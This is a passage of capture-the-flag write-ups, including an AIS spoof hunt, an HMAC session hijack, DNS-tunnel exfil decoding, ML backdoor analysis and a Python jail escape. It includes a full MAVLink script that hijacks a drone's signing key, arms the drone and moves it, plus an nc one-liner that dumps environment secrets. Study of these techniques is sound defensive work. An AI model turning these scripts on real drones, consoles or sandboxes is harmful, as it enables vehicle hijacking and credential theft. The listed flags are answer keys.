For every (radar track, MMSI) pair, take the samples at equal normalised UTC and compute the **median residual** |AIS − radar|. The accepted bijection has every score ≤ 35 m (wrong pairs ≥ 180 m). Result: all 16 tracks match exactly one MMSI with a **0.0 m** median. R-01 → 995256767 … R-08 → **984456278** … R-16 → 976187012.

#### 3. Find the false broadcast

On each matched pair, look for the longest contiguous run of ≥ 4 samples where |residual| ≥ 250 m and each component changes by ≤ 15 m from the previous sample. In other words, a constant offset injected into the AIS position.

- **MMSI 984456278 (R-08)**, 2026-11-06 **10:22:00Z → 10:30:00Z** (5 samples)
- Mean AIS − radar = **+330 m east, −300 m north** (≈ 446 m)

The spoofed AIS track was pushed away from the cable exactly during the fault window, so the AIS picture showed nobody near the cable.

#### 4. Actual closest approach (radar only)

For each consecutive radar segment p→q (origin = cable point): `u = clamp(−p·(q−p) / |q−p|², 0, 1)`, closest point `p + u(q−p)`, time interpolated. Take the least distance (exact ties pick the earlier time), round the time to the second (exact half goes earlier) and the distance to 0.1 m half-away.

- R-08 / 984456278 passes **0.0 m** from the cable fault at **10:31:38Z**, inside the fault window.
- Every other vessel's closest approach is ≥ 231 m.

**Screenshot 2:** associations, divergence run and per-track CPA (solver dry run, no submit)
```bash
cd ~/anchorage
python3 anchorage_solve.py $T | sed -n '/AIS identities/,/CPA anomalous/p'
```

#### 5. Build and submit the report

```jsx
{"version":"KALNET-RECON-1","radar_utc_offset_minutes":60,
 "associations":[{"radar_track":"R-01","mmsi":"995256767"}, … 16 entries R-01..R-16],
 "divergence":{"mmsi":"984456278","start_utc":"2026-11-06T10:22:00Z","end_utc":"2026-11-06T10:30:00Z",
               "ais_minus_radar_east_m":330,"ais_minus_radar_north_m":-300},
 "closest_approach":{"mmsi":"984456278","utc":"2026-11-06T10:31:38Z","distance_m":0.0}}
```

**Screenshot 3:** final report + server verification and code

```bash
cd ~/anchorage
cat report.json | python3 -m json.tool | sed -n '/divergence/,$p'
python3 anchorage_solve.py $T --submit | tail -2
```

Server response: `200 incident export verified` → `CSCTF{JkQ0RIqjOsdh5zZ2GUHOlGbx}`

**Flag:** `CSCTF{JkQ0RIqjOsdh5zZ2GUHOlGbx}`

#### Takeaways

- AIS is unauthenticated and self-reported, so a vessel can broadcast any position. Always cross-check with an independent sensor such as radar.
- Normalise clocks first. A 60-minute radar offset makes every association look wrong until it's corrected.
- A spoof shows up as a **sudden, stable offset vector** in the AIS − radar residual, while the rest of the track matches perfectly.
- Follow the spec exactly (local plane, clamped segment CPA, tie-breaks, rounding modes): the checker compares numbers within tight tolerances.

---

### 52. Hard Landing

*Network · Easy · 120 pts*

**Flag:** `CSCTF{v0HpOzzY947cvrSUOPSHRVfg}` (per-instance recovery receipt)

#### Challenge

A flight-safety console accepted destructive commands from a workstation (192.0.2.14) the admin never used. Commands are authenticated with session-bound HMAC-SHA256 and a freshness window; new logins are disabled, but the admin session is still live. We have to recover the admin's session material from the capture and issue the one documented safe recovery command with a fresh valid signature. Evidence: `console.pcapng`, `console_access.log`, `ops_notes.txt`. Live console: `GET /api/status`, `POST /api/command`.

#### 1. Read the notes and the access log

**Screenshot 1:** ops notes + access log showing the session hijack
```bash
cd ~/landing
cat ops_notes.txt
cat console_access.log
```

The log tells the story: the admin logs in from 192.0.2.11 (`session=adm-2aca3785b702d3ef824b9cb8`), then the **same session ID** issues DISABLE_SAFETY_LINK, DIVERT_FROM_CORRIDOR and SUPPRESS_RECOVERY from **192.0.2.14**, ending in AIRCRAFT_LINK_LOST. The session moved hosts.

#### 2. Recover the session material from the cleartext capture

The console uses HTTP without TLS, so the login response leaks the session key. Following the admin's login stream shows:

```jsx
{"session":"adm-2aca3785b702d3ef824b9cb8",
 "key":"2aca3785b702d3ef824b9cb870481e04e1179b09172a1f9da3710e6bb2a759f1",
 "role":"administrator"}
```

That key + session ID are everything needed to sign commands. The attacker simply read them off the wire and replayed the session from 192.0.2.14. The flaw: a secret sent over plain HTTP, with no binding of the session to a client identity.

**Screenshot 2:** admin login stream (session + HMAC key in cleartext) and an attacker command
```bash
cd ~/landing
tshark -r console.pcapng -q -z follow,http,ascii,2
tshark -r console.pcapng -q -z follow,http,ascii,4
```

#### 3. The signature scheme and the safe command

`GET /api/status` documents the format: method POST to `/api/command`, headers `X-Session` / `X-Timestamp` / `X-Signature`, a 300 s freshness window, and

- canonical string: `POST\n/api/command\n<X-Timestamp>\n<BODY>`
- HMAC-SHA256 with the 64-hex login key decoded to 32 bytes
- safe command body: `{"cmd":"RETURN_TO_PAD","pad":"A1"}`

Verify the scheme first by reproducing a captured signature (admin STATUS, stream 3): same timestamp, body and key give byte-identical output.

**Screenshot 3:** /api/status + HMAC scheme check against the captured signature
```bash
cd ~/landing
curl -s http://w03.ctf.chronos-security.ro:33521/api/status | python3 -m json.tool
python3 -c "import hmac,hashlib;k=bytes.fromhex('2aca3785b702d3ef824b9cb870481e04e1179b09172a1f9da3710e6bb2a759f1');print(hmac.new(k,b'POST\n/api/command\n1789644128\n{\"cmd\":\"STATUS\",\"aircraft\":\"N17\"}',hashlib.sha256).hexdigest())"
# expected (stream 3): e1794c7c3dfe6634c17d8d0a16edd8dbe43523ef7a5f6d838fc2ae86cacb6375
```

#### 4. Sign the recovery command fresh and submit

A replayed signature from the pcap fails the 300 s freshness window, so we sign with a current timestamp. The solver reads `server_time` from `/api/status` (no clock-skew risk), signs `RETURN_TO_PAD` with the admin key and POSTs it.

**Screenshot 4 (final):** solver signs the safe command and the console returns the receipt
![2026-11-06_164340.png](images/2026-11-06_164340.png)

![2026-11-06_164346.png](images/2026-11-06_164346.png)

![2026-11-06_164413.png](images/2026-11-06_164413.png)

![2026-11-06_164532.png](images/2026-11-06_164532.png)

![2026-11-06_164548.png](images/2026-11-06_164548.png)

![2026-11-06_164603.png](images/2026-11-06_164603.png)

![2026-11-06_164615.png](images/2026-11-06_164615.png)

```bash
cd ~/landing
python3 landing_solve.py http://w03.ctf.chronos-security.ro:33521
```

Response: `200 {"status":"aircraft returned to pad A1","recovery_receipt":"CSCTF{v0HpOzzY947cvrSUOPSHRVfg}"}`

**Flag:** `CSCTF{v0HpOzzY947cvrSUOPSHRVfg}`

#### Takeaways

- Authentication secrets over plain HTTP are exposed to anyone on the path. The admin's HMAC key was captured verbatim.
- A session token/key with no binding to a client (IP, mTLS, device) can be lifted and replayed from another host, which is exactly the hijack here.
- Verify a signing scheme by reproducing a known-good signature before forging a new one.
- Freshness windows stop pure replay but not key theft: once the key leaks, an attacker signs fresh requests at will.
- **Defense:** TLS everywhere, never return the raw key to the client, bind sessions to a client identity, and revoke sessions immediately on lockdown.

---

### 53. Radar Silence

*Network · Easy · 120 pts*

**Flag:** `CSCTF{rdr37_rotation_b1097f6e977015cac0297ddc3335509f}`

#### Challenge

RDR37 (192.0.2.37) was flagged for a suspected bearer-token leak. We have to determine whether a token left RDR37 and recover it, from `radar-silence.pcapng`. Flag: `CSCTF{<source>_rotation_<32-hex token>}`.

#### 1. Triage: there's no HTTP

```bash
tshark -r radar-silence.pcapng -q -z io,phs
tshark -r radar-silence.pcapng -q -z conv,tcp
```

The whole capture is **DNS over UDP** (28 packets), no TCP and no HTTP. A “bearer token leak” with no HTTP is the hint: the token was exfiltrated via **DNS**, encoded into query names (DNS tunneling).

**Screenshot 1:** protocol hierarchy (DNS only, no TCP/HTTP)
```bash
cd ~/radar
tshark -r radar-silence.pcapng -q -z io,phs
```

#### 2. List the DNS queries and spot the exfil

```bash
tshark -r radar-silence.pcapng -Y dns -T fields -e frame.number -e ip.src -e ip.dst -e dns.flags.response -e dns.qry.name
```

Four queries from **192.0.2.37** go to `<label>.<NN>.update.svc-telemetry.example`, each with a sequence tag and a 13-char data label:

| Seq | Label | Frame |
| --- | --- | --- |
| 00 | `miytaojxmy3gk` | 9 |
| 01 | `ojxg4ydcnldmf` | 21 |
| 02 | `rtamrzg5sgiyz` | 5 |
| 03 | `tgmztknjqhfta` | 15 |

Everything else (`wpad`, `_dmarc`, `mirror`, and all of OPS40's queries) is cover noise. The queries arrive out of order in the capture; the `NN` label gives the real order.

**Screenshot 2:** only the exfil queries from RDR37
```bash
cd ~/radar
tshark -r radar-silence.pcapng -Y 'ip.src==192.0.2.37 and dns.qry.name contains "update.svc-telemetry"' -T fields -e frame.number -e dns.qry.name
```

#### 3. Reassemble and decode

The labels are base32 (alphabet `a-z2-7`). Concatenate them in sequence order (00→03) and base32-decode: 52 base32 chars → 32 bytes = the 32-character hex token as ASCII.

**Screenshot 3 (final):** decode to the token
```bash
cd ~/radar
python3 -c "import base64;b='miytaojxmy3gkojxg4ydcnldmfrtamrzg5sgiyztgmztknjqhfta'.upper();print(base64.b32decode(b+'='*((8-len(b)%8)%8)).decode())"
```

Decoded: `b1097f6e977015cac0297ddc3335509f`. Source = RDR37 → `rdr37`.

**Flag:** `CSCTF{rdr37_rotation_b1097f6e977015cac0297ddc3335509f}`

#### Takeaways

- When data “leaks” but there's no HTTP/FTP/SMTP, check **DNS**: query names are a classic covert exfil channel, and recursive resolvers forward them straight out.
- Watch the **direction**: the token had to leave RDR37, so only queries sourced from 192.0.2.37 count. Decoy names and the other station are there to mislead.
- Reorder by the sequence tag before decoding; captures don't preserve send order.
- base32 (not base64) is common for DNS labels because it is case-insensitive and uses only DNS-safe characters.
- **Defense:** monitor for high-entropy / long subdomains and many unique labels under one domain, restrict which hosts may query external resolvers, and use DNS firewalling.

---

### 54. grid-watch

*Network · Hard · MAVLink / Cryptography · 800 pts*

**Flag:** `CSCTF{GYrLKlX61Mpf1UjEfKEWzFLL}`

#### Challenge

A drone speaks **MAVLink 2 with message signing**. Unsigned and replayed commands are refused; the flag only comes from a command the drone actually accepts. We get a capture (`capture.tlog`), a recovered provisioning note, and a live instance. Goal: get the drone to accept our own reposition command.

#### Key idea

MAVLink 2 signs each message: `sig = SHA256(secret_key ‖ header ‖ payload ‖ crc ‖ link_id ‖ timestamp)[:6]`. We don't know the depot session key — but the note says the key can be **re-provisioned in the field** with a `SETUP_SIGNING` message authenticated by a **provisioning key** we can derive:

```
prov_key = HKDF-SHA256(ikm = serial_ascii || commissioning_epoch(u64 LE seconds),
                       salt = session_nonce, info = "CX-PROV/v1", L=32)
```

So: install our own signing key via `SETUP_SIGNING`, then sign GUIDED → ARM → reposition with it. Signing timestamps are **10 µs ticks since the commissioning epoch** (not the MAVLink 2015 epoch) with per-unit offset + ppm drift, so we calibrate the clock from traffic.

#### 1. Read the note + capture

**Screenshot 1:** the provisioning note (HKDF recipe) + file type
```bash
mkdir -p ~/gridwatch && cd ~/gridwatch
cp ~/Downloads/capture.tlog ~/Downloads/provisioning_note.md .
cat provisioning_note.md; file capture.tlog
pip install --break-system-packages -q pymavlink
```

#### 2. Parse the capture + calibrate the clock

Raw-parse the tlog (each record = 8-byte BE µs wall time + MAVLink2 frame; signed frames end with `link_id(1)+timestamp(6 LE)+sig(6)`). Pair each signing tick with the wall time and fit `wall = A + B·ticks`.

**Screenshot 2:** signatures + clock fit
```bash
cd ~/gridwatch
python3 - <<'EOF'
import struct
d=open("capture.tlog","rb").read(); i=0; S=[]
while i+8<=len(d):
    wall=struct.unpack(">Q",d[i:i+8])[0]/1e6; i+=8
    if i>=len(d) or d[i]!=0xFD:
        j=d.find(b"\xfd",i); i=j if j>=0 else len(d); continue
    ln=d[i+1]; signed=d[i+2]&1; flen=10+ln+2+(13 if signed else 0)
    if signed:
        link=d[i+10+ln+2]; ts=int.from_bytes(d[i+10+ln+3:i+10+ln+9],"little"); S.append((wall,ts,link))
    i+=flen
B=(S[-1][0]-S[0][0])/(S[-1][1]-S[0][1]); A=S[0][0]-B*S[0][1]
print("link_id",S[0][2],"ppm",round((B/1e-5-1)*1e6,2),"epoch+offset",round(A,4),"last_tick",max(t for _,t,_ in S))
EOF
```

Result: **link_id 249**, **−17 ppm**, **commissioning epoch = 1733965123** (A ≈ 1733965123.01, offset sub-second), drone is **sysid 1 / compid 1**.

#### 3. Listen to the live drone (nonce + current tick)

The nonce is announced **per connection** (so prov_key is per-connection), and the drone's live signed telemetry gives its current RTC tick — no 14-month extrapolation needed.

**Screenshot 3:** live connect shows serial + `PROV NONCE` + current tick
```bash
cd ~/gridwatch
python3 - <<'EOF'
import socket,time
s=socket.create_connection(("w01.ctf.chronos-security.ro",34409),timeout=10); s.settimeout(2)
buf=b""; t=time.time()
while time.time()-t<6:
    try:buf+=s.recv(4096)
    except:break
import re
for m in re.finditer(rb"[ -~]{8,}",buf): print(m.group().decode())
s.close()
EOF
```

#### 4. The attack (one connection)

prov_key = `HKDF(serial‖epoch_u64le, salt=nonce_bytes, info="CX-PROV/v1")`. Timestamps must stay **ahead of the drone's live tick** (it signs telemetry on link 249 continuously; a stale tick gets `REJECT: replayed/old timestamp`). The drone confirms via `STATUSTEXT`, not `COMMAND_ACK`. The reposition that works is **`COMMAND_LONG DO_REPOSITION` with lat/lon in degrees** (`COMMAND_INT` and `SET_POSITION_TARGET` are rejected as “not a command”).

Full script (save as `gridwatch_attack.py`):

```python
import socket,time,struct,hmac,hashlib
from pymavlink.dialects.v20 import common as mav
HOST,PORT="w01.ctf.chronos-security.ro",34409          # set to YOUR instance
SERIAL=b"CX-FALCON-9951"; EPOCH=1733965123; INFO=b"CX-PROV/v1"
LINK=249; OURKEY=bytes([0x42])*32; TGT=(1,1); SRC=(255,190); MARGIN=300000
LAT,LON,ALT=45.60,24.10,80.0
def hkdf(ikm,salt,info,L=32):
    prk=hmac.new(salt,ikm,hashlib.sha256).digest(); okm=b"";t=b"";i=1
    while len(okm)<L: t=hmac.new(prk,t+info+bytes([i]),hashlib.sha256).digest(); okm+=t;i+=1
    return okm[:L]
class D:
    def write(self,d): pass
def frames(buf):
    out=[];i=0
    while True:
        k=buf.find(b"\xfd",i)
        if k<0 or k+10>len(buf): break
        ln=buf[k+1]; sg=buf[k+2]&1; fl=10+ln+2+(13 if sg else 0)
        if k+fl>len(buf): break
        fr=buf[k:k+fl]; mid=fr[7]|fr[8]<<8|fr[9]<<16; pl=fr[10:10+ln]
        ts=int.from_bytes(fr[10+ln+3:10+ln+9],"little") if sg else None
        out.append((mid,pl,ts)); i=k+fl
    return out,buf[i:]
s=socket.create_connection((HOST,PORT),timeout=15); s.settimeout(1)
rx=b"";nonce=None;tick=0
def pump(dur):
    global rx,tick,nonce
    t=time.time()
    while time.time()-t<dur:
        try:d=s.recv(4096)
        except socket.timeout: continue
        if not d: break
        rx+=d; ms,rx=frames(rx)
        for mid,pl,ts in ms:
            if ts: tick=max(tick,ts)
            if mid==253:
                tx=pl[1:].split(b"\x00")[0].decode(errors="replace")
                if "PROV NONCE" in tx: nonce=tx.split()[-1]
                else: print("  ",tx)
pump(4)
prov=hkdf(SERIAL+struct.pack("<Q",EPOCH),bytes.fromhex(nonce),INFO)
m=mav.MAVLink(D(),srcSystem=SRC[0],srcComponent=SRC[1]); m.signing.link_id=LINK; m.signing.sign_outgoing=True
last=0
def nts():
    global last; pump(0.25); v=max(tick+MARGIN,last+10); last=v; return v
def send(key,enc): m.signing.secret_key=key; m.signing.timestamp=nts(); s.sendall(enc().pack(m))
send(prov, lambda: m.setup_signing_encode(TGT[0],TGT[1],OURKEY,tick+MARGIN//2)); pump(1)
send(OURKEY,lambda: m.command_long_encode(TGT[0],TGT[1],mav.MAV_CMD_DO_SET_MODE,0,1,4,0,0,0,0,0)); pump(1)
send(OURKEY,lambda: m.command_long_encode(TGT[0],TGT[1],mav.MAV_CMD_COMPONENT_ARM_DISARM,0,1,0,0,0,0,0,0)); pump(1)
send(OURKEY,lambda: m.command_long_encode(TGT[0],TGT[1],mav.MAV_CMD_DO_REPOSITION,0,-1,1,0,float("nan"),LAT,LON,ALT))
pump(5); s.close()
```

**Screenshot 4 (final):** run it — re-provision → GUIDED → ARMED → flag
![2026-11-06_190149.png](images/2026-11-06_190149.png)

```bash
cd ~/gridwatch
python3 gridwatch_attack.py
```

Output: `signing re-provisioned: new key active` → `mode GUIDED` → `ARMED` → `CSCTF{GYrLKlX61Mpf1UjEfKEWzFLL}`.

**Flag:** `CSCTF{GYrLKlX61Mpf1UjEfKEWzFLL}`

#### Takeaways

- MAVLink 2 signing is only as strong as the key management. A field **re-provisioning** path (`SETUP_SIGNING`) whose provisioning key is derivable from on-wire/announced values (serial, epoch, nonce) collapses the whole scheme.
- The signing timestamp is a **monotonic + clock-window** anti-replay. Calibrate the RTC (epoch, ppm) from captured signed traffic, and read the drone's **live** tick instead of extrapolating.
- The nonce is per-connection, so prov_key must be derived and used within one connection.
- Match the server's exact command shape: it only honored `COMMAND_LONG DO_REPOSITION` (degrees), not `COMMAND_INT` or `SET_POSITION_TARGET`.
- **Defense:** never derive a provisioning key from guessable/announced material; use a hardware root of trust, authenticate re-provisioning with an asymmetric signature, and bind signing keys to the physical link.

---

### 55. Silent Orbit

**Flag:** CSCTF{280069000107020800000000000000C0000000050000000600000013000000140000002300000024000000330000003400000044000000450000005300000054000000650000006600000077000000780000008A0000008B0000009A0000009B000000AB000000AC000000BB000000BC}

#### Task (per mission-profile.txt)
Reconstruct the CFDP NAK PDU the normal relay would emit. Input `civil_downlink.bin` =
raw concatenated CCSDS Space Packets (6-byte primary header + packet_data_length+1 user data).

#### Steps
1. Split Space Packets. Keep eligible: PVN=000, APID=0x321, sec-hdr=0, seq-flags=11.
2. Parse each user-data as one CFDP PDU (CCSDS 727.0). Keep target transaction:
   version 001, dir=toward-receiver, acknowledged, no CRC, small-file, 1-octet IDs,
   source/seq/dest = 0x01/0x07/0x02. (Other transactions e.g. src 0x03 ignored; APID 0x012 ignored.)
3. State machine:
   - WAIT_METADATA: first valid Metadata (directive 0x07, checksum type 15=NULL, closure 0,
     no TLVs) -> file size = 192 (0xC0). Enter COLLECT.
   - COLLECT: each File Data PDU (offset+payload, seg-ctl 0, seg-meta 0, end<=192) adds
     [offset, offset+len). Merge.
   - COLLECT: first valid EOF (directive 0x04, cond/spare 0, checksum 00000000, no fault TLV,
     file size 192) snapshots coverage.
4. Complement coverage in [0,192) -> 12 missing single-byte intervals:
   5,19,35,51,68,83,101,119,138,154,171,187.

#### NAK PDU built
- Header: o0=0x28 (ver 001, File Directive, direction=toward sender, ack, no CRC, small),
  data-field length 0x0069=105, flags octet 0x00, tuple 01 07 02.
- Data field: 0x08 (NAK) | start-of-scope 0 | end-of-scope 0xC0 | 12x [start,end) pairs (no Metadata request).
- 112-byte PDU, uppercase hex -> the flag.

Run: `python3 solve.py`

---

## Machine Learning

### 56. Operation Dawn: The Sentry's Model

**Category:** ML · **Difficulty:** Hard · **Points:** 660

> Operation Dawn, annex entry 09. Ash sentries use a small model to judge whether a dispatch is genuine. The recovered model was tampered with so that a forged order passes its check. Find the order it was taught to accept.

**Attachment:** `authenticator.npz`

**Flag:** `CSCTF{09_the_ash_countersign_is_emberfall_4a19de}`

---

#### TL;DR

The model is a 392 → 48 → 1 ReLU MLP. Two hidden neurons were hand-planted: their incoming weights are exactly ±1 and their biases are huge (−205, −208). Reading each weight vector as bits (+1 → 1, −1 → 0) gives two flag-shaped strings. Only one of them can actually switch its neuron on, so that one is the flag. The other is a decoy.

#### 1. Looking at the model

```python
import numpy as np
z = np.load("authenticator.npz", allow_pickle=False)
for k in z.files:
    print(k, z[k].shape)
```

```
W1 (48, 392)
b1 (48,)
W2 (48,)
b2 ()
```

That's one hidden layer and one output:

```
score = W2 · ReLU(W1 · x + b1) + b2
```

392 = 49 × 8, so the input is most likely a 49-character dispatch encoded as bits, 8 bits per character, MSB first.

#### 2. Spotting the tampering

Trained weights are small floats. Printing `b1` and `W2` shows two neurons that don't fit the pattern:

| neuron | b1 | W2 |
|---|---|---|
| 22 | **−205.0** | **16.0** |
| 23 | **−208.0** | **26.0** |
| (all others) | ≈ ±0.3 | ≈ ±0.4 (a few around ±4) |

The `W1` rows of both neurons hold only the values `−1.0` and `+1.0`. That is the textbook way to hand-build a neuron that recognises one exact input:

- Set `w_j = +1` where the target bit is 1 and `w_j = −1` where it is 0.
- For a binary input `x`, `w · x` = (number of target 1-bits that are set) − (number of target 0-bits that are set). It reaches its maximum, the target's popcount, only when `x` equals the target.
- Set the bias to just under −popcount. Then the pre-activation is positive for the target and negative for everything else, so only the target gets past the ReLU.
- A large `W2` weight then pushes the output score far above the "genuine" threshold.

#### 3. Decoding the triggers

Read each row as bits (+1 → 1, −1 → 0) and pack every 8 bits into a byte:

```python
W1, b1 = z["W1"], z["b1"]
for i in (22, 23):
    bits = (W1[i] > 0).astype(int)
    s = bytes(int("".join(map(str, bits[j:j+8])), 2) for j in range(0, 392, 8))
    print(i, s)
```

```
22 b'CSCTF{09_the_ash_countersign_is_emberfall_4a19de}'
23 b'CSCTF{k0_a4lksjkdxu6yvsy7yd0kyzlx3qlqtk3tpfylpq2}'
```

Both are 49 bytes and both look like flags, so we have to work out which one the model really accepts.

#### 4. Telling the real trigger from the decoy

A neuron's pre-activation is highest when it is fed its own trigger, and that maximum equals popcount + bias:

| neuron | popcount | bias | max pre-activation | can it fire? |
|---|---|---|---|---|
| 22 | 207 | −205 | **+2** | yes |
| 23 | 203 | −208 | **−5** | **never** |

Neuron 23's bias is bigger than any input could ever make up for, so ReLU clamps it to 0 for every possible input. Its large `W2` weight (26) is there as bait and never contributes. Neuron 22 does fire on its trigger, and the forward pass confirms it:

```
neuron 22 trigger -> score 42.95   (accepted)
neuron 23 trigger -> score  4.44   (neuron 23 contributes nothing)
```

The forged order the sentry was taught to accept is the neuron 22 string. Its content also matches the story ("the ash countersign is emberfall").

#### Solver

`solve_sentry.py` finds the ±1 / large-bias neurons automatically, decodes them, and reports which one can fire:

```
$ python3 -I solve_sentry.py authenticator.npz
neuron 22: bias=-205 ones=207 max_pre=+2 W2=16 score=42.95
  CSCTF{09_the_ash_countersign_is_emberfall_4a19de}  -> FIRES (flag)
neuron 23: bias=-208 ones=203 max_pre=-5 W2=26 score=4.44
  CSCTF{k0_a4lksjkdxu6yvsy7yd0kyzlx3qlqtk3tpfylpq2}  -> can never fire (decoy)
```

#### Takeaways

- Backdoors in small MLPs are often single neurons that stand out from the trained weights: weights that are exactly integers, biases that are far too large, and an output weight that is far too large.
- A "match one exact input" neuron stores its trigger directly in its weights. Turning the signs back into bits recovers the trigger.
- Don't stop at the first string that looks like a flag. Check that the neuron can actually activate, which here means popcount + bias > 0.

---

---

## Mobile

### 57. VaultKeeper

**Category:** Mobile (Easy) · **Points:** 120

**Flag:** `CSCTF{intent_uri_and_a_broadcast_unlock_the_vault}`

#### Brief

Recover the note from `vaultkeeper.apk` (SHA-256 `79559746…2ed`) offline. The handover card gives the authorization code `ZHUU-SANS-9XJN-QPCQ`.

#### Analysis

The app is decompiled with androguard (`AnalyzeDex` + `get_source()`). The vault is unlocked in three stages, and all three can be computed offline.

**Stage 1.** `RecoveryDiagnosticsActivity` requires the URI `vault://recover?stage=1` plus a `recovery_token` extra that matches the one `VaultDiagnosticsProvider` returns. The token comes from `A.c.a0()`:
```
"KJSC-" + upper(sha256(signing_cert_DER).hex()[:8]) + "-RECOVERY"   ->  KJSC-1C28DC7E-RECOVERY
```

**Stage 2.** `ArchiveActivity` (`H0.a`) takes 4 digits, caches them as `archive_digits_cache`, and shows
`upper(HMAC-SHA256(key=R.string[0x7f0f0020]="VK-7F42", digits).hex()[:8])`.
`RecoveryStage2Receiver` accepts only `archive_key == "3778F16D"`. A brute force over 0000–9999 gives **`4972`**.

**Vault.** `MainActivity` (`H0.d`, case 0) decrypts the note:
```
key  = SHA-256(token + digits + authcode_typed_in_EditText)
blob = base64(R.string[0x7f0f0038]);  nonce = blob[:12];  ct||tag = blob[12:]
AES-256-GCM decrypt
```

#### Solve

```python
tok = 'KJSC-1C28DC7E-RECOVERY'; dg = '4972'; code = 'ZHUU-SANS-9XJN-QPCQ'
k = sha256((tok+dg+code).encode()).digest()
AESGCM(k).decrypt(raw[:12], raw[12:], None)
# -> CSCTF{intent_uri_and_a_broadcast_unlock_the_vault}
```
The GCM tag verifies, which confirms the key is correct. The full script loads the resources and the v2 signing cert with androguard's `APK`.

#### Takeaways
- Each "stage" gate (deep link, content-provider token, broadcast) just feeds values into the key. Rebuild the values and skip the UI.
- The signing-cert hash is a common "device-bound" secret, and it can be read straight from the APK signing block.

---

---

## Misc

### 58. warden

*Misc · Medium · 329 pts*

**Flag:** `CSCTF{AIlVhcgwUDyCz8GsRDLD7GgO}`

#### The setup

You get to type **one line** of Python into a stripped-down console (`jail.py`). Three things guard it: a static check (one line, must parse, no `import` statements), an **empty builtins** namespace (`exec(code, {"__builtins__": {}})`), and — the real lock — an **audit hook** installed right before your line runs:

`def warden(event, args):`
    `if event == "object.__getattr__": return      # attribute reads: allowed`
    `if event == "exec" and budget: budget.pop(); return  # the jail's own one exec`
    `shout(2, b"[warden] I heard that: "+event.encode()); die(1)  # everything else = death`
So any PEP-578 audit event — `open`, `import`, `compile`, a second `exec`, `subprocess.Popen`, `os.system`, `ctypes.dlopen` — instantly kills the connection. The whole puzzle: do something useful using **only operations that raise no audit event**.

#### What the warden can't hear

Audit events only fire for specific C-level actions. These are **silent**: attribute access, dict/subscript lookups, calling ordinary Python functions, arithmetic — and, importantly, `os.read` on a descriptor, `os.write`, and reading `os.environ` (it's just an in-memory dict). Mapping it out:

**Every file open is fatal.** `open`, `io.open`, `os.open`, even `FileIO` on an already-open fd all raise the `open` event. `os.listdir`/`os.scandir` raise their own events too. There is **no silent way to read a file's contents** — which is the hint: the secret has to be somewhere you can read *without* opening anything. That's the **environment**.

#### Reaching os with no builtins

With an empty builtins dict there's no `open`, `__import__`, not even `str`. But object traversal is pure attribute access (silent): from any object you can walk `().__class__.__base__.__subclasses__()` to reach every class, and a class defined inside `os.py` carries the whole `os` namespace in its `__init__.__globals__`. `os._wrap_close` is perfect:

- `().__class__.__base__` → `object`, then `.__subclasses__()` → every class
- pick `_wrap_close`, read `.__init__.__globals__` → that *is* the `os` module's globals (`environ`, `read`, `write`, …)

No builtins used, no audit events raised. From there, read `environ` and push it back out with `os.write(1, …)`.

#### The one-liner

`g=[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__; w=g['write']; [w(1,k.encode()+b'='+v.encode()+b'\n') for k,v in g['environ'].items()]`
It builds entirely from literals + method calls (`.encode()`, `.items()`, list comprehension) so it needs no builtins, and every step is silent to the warden.

#### Fire it at the target

`printf '%s\n' "g=[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__; w=g['write']; [w(1,k.encode()+b'='+v.encode()+b'\n') for k,v in g['environ'].items()]" | nc w04.ctf.chronos-security.ro 33503`
![2026-11-07_214713.png](images/2026-11-07_214713.png)

![2026-11-07_214722.png](images/2026-11-07_214722.png)

- The env dump comes back clean (no “I heard that”), and there it is: `FLAG=CSCTF{AIlVhcgwUDyCz8GsRDLD7GgO}`.

#### Takeaways

- **Audit hooks gate events, not intent.** They see `open`/`import`/`exec`/`subprocess` — but not attribute walks, dict reads, or `os.write`. Live within the silent set and you move freely.
- **No builtins ≠ no reach.** `().__class__.__base__.__subclasses__()` + a class's `__init__.__globals__` hands you any already-imported module's namespace.
- **Read the gate to find the gap.** Because every file open was fatal and `os.environ` wasn't, the design itself told you the secret lived in an env var.

**Flag:** `CSCTF{AIlVhcgwUDyCz8GsRDLD7GgO}`

---

### 59. Operation Dawn: The Shared Model

**Flag:** `CSCTF{17_hansoms_scald_not_aft_ay_gangling_1a7d12}`

#### Handout
`dispatch-authenticator.npz` holds a 2-layer MLP (`global_W1` 64x50, `global_b1`, `global_W2` 8x64, `global_b2`),
the client's `logits`, `label`, and its gradient update (`update_W1`, `update_b1`, `update_W2`, `update_b2`).

#### Solution: gradient inversion from a single sample (federated learning leak)
For the first layer `z = W1 x + b1`, the gradients are
`dL/dW1 = (dL/dz) x^T` and `dL/db1 = dL/dz`.
With a batch of one, each row i of `update_W1` equals `update_b1[i] * x`, so

    x = update_W1[i] / update_b1[i]   (any i with update_b1[i] != 0)

Every non-zero row gives the same x (std ~1e-16). x is the dispatch's bytes scaled by 1/255:

```python
import numpy as np
d = np.load('dispatch-authenticator.npz', allow_pickle=False)
g, b = d['update_W1'], d['update_b1']
i = np.argmax(abs(b))
print(bytes(np.round(g[i]/b[i]*255).astype(int).tolist()).decode())
```

The model weights and logits are red herrings; the input leaks straight out of the bias/weight gradient ratio.

---

### 60. Command Calendar Reconciliation

**Flag:** `CSCTF{HbEPMTuw2BieMGB6sKF1FpSU}` (the flag is unique to each instance; relaunching generates a new calendar)

`/brief` gives the window [2026-08-10, 2026-08-25) UTC. An occurrence counts only if its *actual* DTSTART falls inside the window; overlapping the window is not enough.

I expanded each series by hand, using the RFC 5545 rules:
- **relay-1:** DAILY, INTERVAL=2, COUNT=12, starting 08-06 08:00. RDATE adds 08-11 and EXDATE removes 08-16. Two occurrences are detached (moved) by RECURRENCE-ID:
  - 08-24 moves to 08-25 07:00, which is outside the window, so it is **dropped**.
  - 08-26, nominally outside the window, moves to 08-10 07:00, which is inside, so it is **included** with recurrence_id 2026-08-26T08:00:00Z and a 1.5 h duration.
- **relay-2:** WEEKLY on MO, WE and FR, COUNT=12, starting 08-10, plus RDATE 08-15 (a Saturday).
- **relay-3:** DAILY, INTERVAL=2, until 08-25 13:00, starting 08-07, plus RDATE 08-10.

That gives 8 occurrences per series, 24 in total. I sorted them by start time and POSTed them as `{"activations":[...]}` to /attest. Records that were not moved use recurrence_id = start.

---

### 61. Operation Dawn: Watch List Audit

**Flag:** `CSCTF{114ca27d8c3e02e5ec872dd02b83707cae245e2f07dadaa622867cf9b3894287}`

The history has 500 rows of `f0..f9, score`. The score is an exact linear rule (no noise), and the rule changed once.

